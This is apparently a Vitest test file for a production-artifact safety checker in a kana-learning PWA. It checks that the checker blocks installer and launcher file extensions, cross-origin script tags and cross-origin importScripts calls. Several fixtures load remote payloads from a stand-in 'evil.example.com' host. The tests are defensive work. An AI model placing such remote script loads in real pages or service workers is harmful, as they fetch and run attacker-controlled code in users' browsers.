import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import {
  checkProductionArtifactSafety,
  findCrossOriginHtmlScriptSrcs,
  findCrossOriginImportScripts,
  findForbiddenExtensionFiles,
} from './checkProductionArtifactSafety.mjs'

describe('findForbiddenExtensionFiles', () => {
  it('flags native installer and script-launcher extensions', () => {
    expect(
      findForbiddenExtensionFiles([
        'assets/installer.exe',
        'assets/app.apk',
        'assets/setup.msi',
        'assets/bundle.msix',
        'assets/bundle.appx',
        'assets/image.dmg',
        'assets/pkg.pkg',
        'assets/screensaver.scr',
        'assets/legacy.com',
        'assets/launch.bat',
        'assets/launch.cmd',
        'assets/launch.ps1',
      ]),
    ).toHaveLength(12)
  })

  it('does not flag normal Vite/PWA web assets', () => {
    expect(
      findForbiddenExtensionFiles([
        'index.html',
        'sw.js',
        'workbox-8553a241.js',
        'assets/index-abc123.js',
        'assets/index-abc123.mjs',
        'assets/index-abc123.css',
        'assets/font.woff2',
        'assets/font.wasm',
        'audio/a.mp3',
        'icons/icon-192.png',
        'manifest.webmanifest',
        'data.json',
      ]),
    ).toEqual([])
  })

  it('is case-insensitive', () => {
    expect(findForbiddenExtensionFiles(['setup.EXE'])).toEqual(['setup.EXE'])
  })
})

describe('findCrossOriginHtmlScriptSrcs', () => {
  it('flags an absolute cross-origin <script src>', () => {
    const html = '<script src="https://evil.example.com/payload.js"></script>'
    expect(findCrossOriginHtmlScriptSrcs(html)).toEqual(['https://evil.example.com/payload.js'])
  })

  it('flags a protocol-relative cross-origin <script src>', () => {
    const html = '<script src="//evil.example.com/payload.js"></script>'
    expect(findCrossOriginHtmlScriptSrcs(html)).toEqual(['//evil.example.com/payload.js'])
  })

  it('passes a same-origin absolute-path <script src> (the real build output shape)', () => {
    const html = '<script type="module" crossorigin src="/kana-game/assets/index-xYhv7JvV.js"></script>'
    expect(findCrossOriginHtmlScriptSrcs(html)).toEqual([])
  })

  it('passes a same-origin relative <script src>', () => {
    const html = '<script src="assets/index-abc123.js"></script>'
    expect(findCrossOriginHtmlScriptSrcs(html)).toEqual([])
  })

  it('passes a full same-origin absolute <script src>', () => {
    const html = '<script src="https://app.tamamizu.giganihongo.com/assets/index.js"></script>'
    expect(findCrossOriginHtmlScriptSrcs(html)).toEqual([])
  })

  it('ignores a data-src attribute (not a real script src)', () => {
    const html = '<script data-src="https://evil.example.com/payload.js"></script>'
    expect(findCrossOriginHtmlScriptSrcs(html)).toEqual([])
  })
})

describe('findCrossOriginImportScripts', () => {
  it('flags a literal cross-origin importScripts() call', () => {
    const js = 'importScripts("https://evil.example.com/malicious.js")'
    expect(findCrossOriginImportScripts(js)).toEqual(['https://evil.example.com/malicious.js'])
  })

  it('passes a literal same-origin importScripts() call', () => {
    const js = "importScripts('https://app.tamamizu.giganihongo.com/workbox-abc123.js')"
    expect(findCrossOriginImportScripts(js)).toEqual([])
  })

  it('does not flag a variable-argument importScripts() call (the real workbox loader shape)', () => {
    // This mirrors the AMD-shim loader vite-plugin-pwa actually generates in
    // dist/sw.js: importScripts(n) where n is a computed variable, not a
    // literal URL string. Naively scanning for any URL-shaped string in the
    // file would false-positive on unrelated strings; this must not.
    const js = 'const n = someUrl; if(!("document" in self)) { importScripts(n) }'
    expect(findCrossOriginImportScripts(js)).toEqual([])
  })

  it('does not flag an unrelated http(s) URL that is not an importScripts() argument', () => {
    const js = 'const helpUrl = "https://evil.example.com/docs"; console.log(helpUrl)'
    expect(findCrossOriginImportScripts(js)).toEqual([])
  })
})

describe('checkProductionArtifactSafety', () => {
  let dir: string

  afterEach(() => {
    if (dir) rmSync(dir, { recursive: true, force: true })
  })

  function write(relativePath: string, content: string) {
    const absolutePath = join(dir, relativePath)
    mkdirSync(join(absolutePath, '..'), { recursive: true })
    writeFileSync(absolutePath, content)
  }

  it('fails closed when the target directory is missing', () => {
    expect(() => checkProductionArtifactSafety(join(tmpdir(), 'does-not-exist-artifact-dir'))).toThrow(
      /Build artifact directory not found/,
    )
  })

  it('passes a normal Vite/PWA build shape', () => {
    dir = mkdtempSync(join(tmpdir(), 'artifact-safety-ok-'))
    write(
      'index.html',
      '<!doctype html><html><head>'
      + '<script type="module" crossorigin src="/kana-game/assets/index-xYhv7JvV.js"></script>'
      + '<link rel="stylesheet" href="/kana-game/assets/index-abc.css">'
      + '</head><body><div id="root"></div></body></html>',
    )
    write('assets/index-xYhv7JvV.js', 'console.log("app")')
    write('assets/index-abc.css', 'body { margin: 0; }')
    write('assets/font.woff2', 'binary-ish')
    write('manifest.webmanifest', '{"name":"Tamamizu"}')
    write('icons/icon-192.png', 'binary-ish')
    write('sw.js', 'define(["./workbox-8553a241"],function(e){});')
    write('workbox-8553a241.js', 'importScripts;/* workbox runtime */')

    const result = checkProductionArtifactSafety(dir)
    expect(result.failures).toEqual([])
    expect(result.summary.filesScanned).toBe(8)
    expect(result.summary.htmlFilesScanned).toBe(1)
    expect(result.summary.serviceWorkerFilesScanned).toBe(2)
  })

  it('fails on a shipped native installer/executable file', () => {
    dir = mkdtempSync(join(tmpdir(), 'artifact-safety-exe-'))
    write('index.html', '<!doctype html><html><body></body></html>')
    write('downloads/TamamizuSetup.exe', 'MZ')

    const result = checkProductionArtifactSafety(dir)
    expect(result.failures).toEqual([
      'Forbidden shipped file extension ".exe": downloads/TamamizuSetup.exe',
    ])
  })

  it('fails on a shipped APK', () => {
    dir = mkdtempSync(join(tmpdir(), 'artifact-safety-apk-'))
    write('index.html', '<!doctype html><html><body></body></html>')
    write('downloads/app.apk', 'PK')

    const result = checkProductionArtifactSafety(dir)
    expect(result.failures).toEqual([
      'Forbidden shipped file extension ".apk": downloads/app.apk',
    ])
  })

  it('fails on a shipped shell/PowerShell launcher', () => {
    dir = mkdtempSync(join(tmpdir(), 'artifact-safety-ps1-'))
    write('index.html', '<!doctype html><html><body></body></html>')
    write('scripts/install.ps1', 'Write-Host "hi"')

    const result = checkProductionArtifactSafety(dir)
    expect(result.failures).toEqual([
      'Forbidden shipped file extension ".ps1": scripts/install.ps1',
    ])
  })

  it('fails on a cross-origin <script src> in a built HTML file', () => {
    dir = mkdtempSync(join(tmpdir(), 'artifact-safety-html-cross-'))
    write(
      'index.html',
      '<!doctype html><html><head><script src="https://evil.example.com/payload.js"></script></head><body></body></html>',
    )

    const result = checkProductionArtifactSafety(dir)
    expect(result.failures).toEqual([
      'Cross-origin <script src> in index.html: https://evil.example.com/payload.js',
    ])
  })

  it('passes a same-origin/relative <script src> in a built HTML file', () => {
    dir = mkdtempSync(join(tmpdir(), 'artifact-safety-html-same-'))
    write(
      'index.html',
      '<!doctype html><html><head>'
      + '<script type="module" crossorigin src="/kana-game/assets/index-abc.js"></script>'
      + '</head><body></body></html>',
    )
    write('assets/index-abc.js', 'console.log("app")')

    const result = checkProductionArtifactSafety(dir)
    expect(result.failures).toEqual([])
  })

  it('fails on a cross-origin importScripts() call in a generated service-worker file', () => {
    dir = mkdtempSync(join(tmpdir(), 'artifact-safety-sw-cross-'))
    write('index.html', '<!doctype html><html><body></body></html>')
    write('sw.js', 'importScripts("https://evil.example.com/malicious.js")')

    const result = checkProductionArtifactSafety(dir)
    expect(result.failures).toEqual([
      'Cross-origin importScripts() in sw.js: https://evil.example.com/malicious.js',
    ])
  })

  it('does not fail on harmless URLs appearing in ordinary (non-service-worker) JS', () => {
    dir = mkdtempSync(join(tmpdir(), 'artifact-safety-ordinary-js-'))
    write('index.html', '<!doctype html><html><body></body></html>')
    write(
      'assets/index-abc.js',
      'const helpUrl = "https://evil.example.com/docs"; '
      + 'importScripts("https://evil.example.com/only-matters-in-a-worker.js");',
    )

    const result = checkProductionArtifactSafety(dir)
    expect(result.failures).toEqual([])
  })
})
